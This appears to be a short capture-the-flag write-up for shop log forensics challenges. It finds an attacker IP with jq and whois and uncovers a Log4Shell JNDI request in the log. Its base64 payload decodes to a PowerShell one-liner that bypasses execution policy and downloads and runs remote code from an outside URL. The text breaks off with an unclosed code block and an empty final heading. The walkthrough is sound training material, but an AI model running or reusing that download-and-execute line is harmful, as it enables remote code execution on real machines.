Here are the flags and the walkthrough

#### Shop-Knock Knock Knock 
Okay then, this should be something easy... lets look for a bunch of logins from the same ip.
You could use something like this or even look into the file...
```shell
cat DownUnderShop.JSON# | jq '. | .origin, .url' | grep -B1 login
```
Then you will see, that the IP of the attacker should be `58.164.62.91`.
So now we can use `whois`

```shell
whois 58.164.62.91                                                                                                                2 ✘  10s 

#### Shop-Logging for what?

Found in line `2675` a strange JNDI request... looks like Log4Shell or something.

```shell
echo "cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=" | base64 -d
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');"%
```

> flag: pTCNp5p6LP0d7qA77yvb4SHf40

#### Shop-I'm just looking!
